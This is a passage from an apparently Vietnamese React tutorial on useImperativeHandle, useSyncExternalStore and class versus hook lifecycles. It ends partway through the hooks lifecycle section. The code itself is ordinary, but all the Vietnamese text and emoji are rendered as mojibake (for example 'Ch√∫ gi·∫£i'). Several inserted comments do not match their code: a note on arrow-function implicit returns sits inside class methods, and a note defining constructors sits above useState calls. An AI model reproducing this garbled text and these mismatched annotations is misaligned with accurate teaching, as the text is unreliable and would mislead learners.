      <button onClick={() => formRef.current?.submit()}>Submit</button>
      <button onClick={() => formRef.current?.reset()}>Reset</button>
    </>
  );
}
```

**‚ö†Ô∏è Best Practices:**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå Don't expose entire DOM node
useImperativeHandle(ref, () => inputRef.current);

 // Ch√∫ gi·∫£i: ‚úÖ Expose specific methods
useImperativeHandle(ref, () => ({
  focus: () => inputRef.current?.focus()
}));

 // Ch√∫ gi·∫£i: ‚ùå Don't overuse (prefer props/callbacks)
 // Ch√∫ gi·∫£i: Imperative API should be last resort

 // Ch√∫ gi·∫£i: ‚úÖ Use declarative approach when possible
<Input autoFocus onClear={handleClear} /> // Ch√∫ gi·∫£i: Declarative
vs
inputRef.current.focus(); // Ch√∫ gi·∫£i: Imperative
```

---

##### **1.10. useSyncExternalStore - Sync with External Store**

**üéØ M·ª•c ƒë√≠ch:**
Subscribe to external stores (Redux, Zustand, browser APIs) m·ªôt c√°ch an to√†n v·ªõi React 18+ concurrent rendering.

**üìñ T·∫°i sao c·∫ßn hook n√†y:**
- React 18+ c√≥ concurrent rendering ‚Üí c√≥ th·ªÉ render nhi·ªÅu l·∫ßn tr∆∞·ªõc commit
- External stores (kh√¥ng ph·∫£i React state) c√≥ th·ªÉ thay ƒë·ªïi gi·ªØa c√°c l·∫ßn render
- useSyncExternalStore ƒë·∫£m b·∫£o consistency

**üí° Chi ti·∫øt k·ªπ thu·∫≠t:**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: BASIC PATTERN
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const store = {
  listeners: new Set(),
  state: { count: 0 },
  
  subscribe(listener) {
    this.listeners.add(listener);
    return () => this.listeners.delete(listener);
  },
  
  getSnapshot() {
    return this.state;
  },
  
  increment() {
    this.state = { count: this.state.count + 1 };
    this.listeners.forEach(listener => listener());
  }
};

function Counter() {
  const state = useSyncExternalStore(
    store.subscribe.bind(store), // Ch√∫ gi·∫£i: subscribe function
    store.getSnapshot.bind(store) // Ch√∫ gi·∫£i: getSnapshot function
  );
  
  return (
    <div>
      <p>Count: {state.count}</p>
      <button onClick={() => store.increment()}>Increment</button>
    </div>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: BROWSER APIs (window.online)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function useOnlineStatus() {
  return useSyncExternalStore(
    (callback) => {
      window.addEventListener('online', callback);
      window.addEventListener('offline', callback);
      return () => {
        window.removeEventListener('online', callback);
        window.removeEventListener('offline', callback);
      };
    },
    () => navigator.onLine, // Ch√∫ gi·∫£i: getSnapshot
    () => true // Ch√∫ gi·∫£i: getServerSnapshot (SSR)
  );
}

function StatusBar() {
  const isOnline = useOnlineStatus();
  return <div>{isOnline ? 'üü¢ Online' : 'üî¥ Offline'}</div>;
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: WINDOW SIZE
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function useWindowSize() {
  return useSyncExternalStore(
    (callback) => {
      window.addEventListener('resize', callback);
      return () => window.removeEventListener('resize', callback);
    },
    () => ({ width: window.innerWidth, height: window.innerHeight }),
    () => ({ width: 0, height: 0 }) // Ch√∫ gi·∫£i: SSR fallback
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: ZUSTAND STORE (Example)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const useStore = create((set) => ({
  count: 0,
  increment: () => set((state) => ({ count: state.count + 1 }))
}));

 // Ch√∫ gi·∫£i: Zustand internally uses useSyncExternalStore (React 18+)
function Counter() {
  const count = useStore(state => state.count);
  const increment = useStore(state => state.increment);
  
  return <button onClick={increment}>{count}</button>;
}
```

**üí° Note:**
- H·∫ßu h·∫øt developers KH√îNG c·∫ßn d√πng tr·ª±c ti·∫øp
- Libraries (Redux, Zustand, Jotai) ƒë√£ integrate internally
- Ch·ªâ c·∫ßn khi build custom state management library

---

#### **üìö PH·∫¶N 2: LIFECYCLE - CLASS VS FUNCTIONAL COMPONENTS**

---

##### **2.1. Class Component Lifecycle**

```typescript
class MyComponent extends React.Component {
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
  // MOUNTING PHASE (Component ƒë∆∞·ª£c t·∫°o v√† th√™m v√†o DOM)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
  
  constructor(props) {
    super(props);
 // Ch√∫ gi·∫£i: 1. Kh·ªüi t·∫°o state
    this.state = { count: 0 };
 // D√πng `bind`, `call`, ho·∫∑c `apply` ƒë·ªÉ thi·∫øt l·∫≠p `this` r√µ r√†ng khi c·∫ßn.
    this.handleClick = this.handleClick.bind(this);
    // ‚ö†Ô∏è KH√îNG g·ªçi setState() ·ªü ƒë√¢y!
    // ‚ö†Ô∏è KH√îNG c√≥ side effects (API calls, subscriptions)
  }
  
  static getDerivedStateFromProps(props, state) {
    // 2. Sync state v·ªõi props (HI·∫æM khi d√πng)
 // Ch√∫ gi·∫£i: Ch·∫°y TR∆Ø·ªöC m·ªói render (mount + update)
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
    if (props.value !== state.value) {
      return { value: props.value };
    }
    return null;
  }
  
  componentDidMount() {
    // 3. Component ƒë√£ mount v√†o DOM
 // Ch√∫ gi·∫£i: ‚úÖ PERFECT cho:
 // Ch√∫ gi·∫£i: - API calls / Data fetching
 // Ch√∫ gi·∫£i: - Subscriptions (WebSocket, EventEmitter)
 // Ch√∫ gi·∫£i: - DOM manipulation
 // Ch√∫ gi·∫£i: - Setup timers/intervals
    
 // Ch√∫ gi·∫£i: Example:
    fetch('/api/data')
      .then(res => res.json())
      .then(data => this.setState({ data }));
    
    this.timer = setInterval(() => {
      this.setState({ time: new Date() });
    }, 1000);
    
    document.addEventListener('click', this.handleClick);
  }
  
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
  // UPDATING PHASE (Props ho·∫∑c State thay ƒë·ªïi)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
  
  shouldComponentUpdate(nextProps, nextState) {
    // 4. Quy·∫øt ƒë·ªãnh c√≥ render l·∫°i kh√¥ng (performance optimization)
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
    // ‚ö†Ô∏è PureComponent t·ª± ƒë·ªông implement shallow comparison
    
    return nextProps.id !== this.props.id || 
           nextState.count !== this.state.count;
  }
  
  getSnapshotBeforeUpdate(prevProps, prevState) {
    // 5. Capture DOM info TR∆Ø·ªöC khi update (HI·∫æM d√πng)
    // Return value ‚Üí pass v√†o componentDidUpdate
    
 // Ch√∫ gi·∫£i: Example: Preserve scroll position
    if (prevProps.list.length < this.props.list.length) {
      return this.listRef.scrollHeight;
    }
    return null;
  }
  
  componentDidUpdate(prevProps, prevState, snapshot) {
    // 6. Component ƒë√£ re-render
 // Ch√∫ gi·∫£i: ‚úÖ PERFECT cho:
    // - Fetch data khi props thay ƒë·ªïi
 // Ch√∫ gi·∫£i: - DOM manipulation based on changes
 // Ch√∫ gi·∫£i: - Update third-party libraries
    
    // ‚ö†Ô∏è MUST so s√°nh props/state tr∆∞·ªõc khi setState (tr√°nh infinite loop!)
    if (this.props.userId !== prevProps.userId) {
      this.fetchUser(this.props.userId);
    }
    
 // Ch√∫ gi·∫£i: Use snapshot from getSnapshotBeforeUpdate
    if (snapshot !== null) {
      this.listRef.scrollTop = 
        this.listRef.scrollHeight - snapshot;
    }
  }
  
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: UNMOUNTING PHASE (Component b·ªã remove kh·ªèi DOM)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
  
  componentWillUnmount() {
 // Ch√∫ gi·∫£i: 7. Cleanup tr∆∞·ªõc khi unmount
    // ‚úÖ REQUIRED ƒë·ªÉ tr√°nh memory leaks:
 // Ch√∫ gi·∫£i: - Clear timers/intervals
 // Ch√∫ gi·∫£i: - Cancel network requests
 // Ch√∫ gi·∫£i: - Unsubscribe
 // Ch√∫ gi·∫£i: - Remove event listeners
    
    clearInterval(this.timer);
    document.removeEventListener('click', this.handleClick);
    this.subscription.unsubscribe();
  }
  
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: ERROR HANDLING
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
  
  static getDerivedStateFromError(error) {
    // 8. Update state khi c√≥ error
    return { hasError: true };
  }
  
  componentDidCatch(error, errorInfo) {
 // Ch√∫ gi·∫£i: 9. Log error info
    logErrorToService(error, errorInfo);
  }
  
  render() {
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
    // ‚ö†Ô∏è KH√îNG setState, side effects ·ªü ƒë√¢y!
    return <div>{this.state.count}</div>;
  }
}
```

**üìä Lifecycle Diagram:**

```
MOUNTING:
constructor ‚Üí getDerivedStateFromProps ‚Üí render ‚Üí componentDidMount

UPDATING (props/state change):
getDerivedStateFromProps ‚Üí shouldComponentUpdate ‚Üí render ‚Üí 
getSnapshotBeforeUpdate ‚Üí componentDidUpdate

UNMOUNTING:
componentWillUnmount

ERROR:
getDerivedStateFromError ‚Üí componentDidCatch
```

---

##### **2.2. Functional Component Lifecycle (v·ªõi Hooks)**

```typescript
function MyComponent(props) {
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
  const [count, setCount] = useState(0);
  const [data, setData] = useState(null);
  
 // Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
  const [expensiveState, setExpensiveState] = useState(() => {
    return computeExpensiveValue();
  });
  
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: EQUIVALENT TO: getDerivedStateFromProps
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
  // ‚ùå Kh√¥ng c·∫ßn! Ch·ªâ compute trong render
  const derivedValue = props.value * 2;
  
  // Ho·∫∑c n·∫øu c·∫ßn sync v·ªõi state:
  const [value, setValue] = useState(props.initialValue);
  useEffect(() => {
    setValue(props.initialValue);
  }, [props.initialValue]);
  
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: EQUIVALENT TO: componentDidMount
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
  useEffect(() => {
 // Ch√∫ gi·∫£i: Ch·∫°y SAU first render
    console.log('Mounted');
    
    fetch('/api/data')
      .then(res => res.json())
      .then(setData);
    
    const timer = setInterval(() => {}, 1000);
    
    document.addEventListener('click', handleClick);
    
 // Ch√∫ gi·∫£i: EQUIVALENT TO: componentWillUnmount
    return () => {
      console.log('Unmounted');
      clearInterval(timer);
      document.removeEventListener('click', handleClick);
    };
  }, []); // Ch√∫ gi·∫£i: Empty deps = ch·ªâ ch·∫°y khi mount/unmount
  
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: EQUIVALENT TO: componentDidUpdate (specific value)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
  useEffect(() => {
    // Ch·∫°y khi userId thay ƒë·ªïi
    console.log('userId changed:', props.userId);
    fetchUser(props.userId);
  }, [props.userId]); // Ch√∫ gi·∫£i: Dependency: userId
  
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: EQUIVALENT TO: componentDidUpdate (every render)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
  useEffect(() => {
 // Ch√∫ gi·∫£i: Ch·∫°y SAU m·ªói render
    console.log('Component updated');
  }); // Ch√∫ gi·∫£i: No deps = ch·∫°y m·ªói render
  
 // Ch√∫ gi·∫£i: Track previous value (like prevProps/prevState)
  const prevCount = usePrevious(count);
  useEffect(() => {
    if (prevCount !== count) {
      console.log(`Count changed from ${prevCount} to ${count}`);
    }
  }, [count, prevCount]);
  
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: EQUIVALENT TO: shouldComponentUpdate
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
  // D√πng React.memo thay v√¨ hook
  // (xem ph·∫ßn React.memo b√™n d∆∞·ªõi)
  
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: EQUIVALENT TO: getSnapshotBeforeUpdate
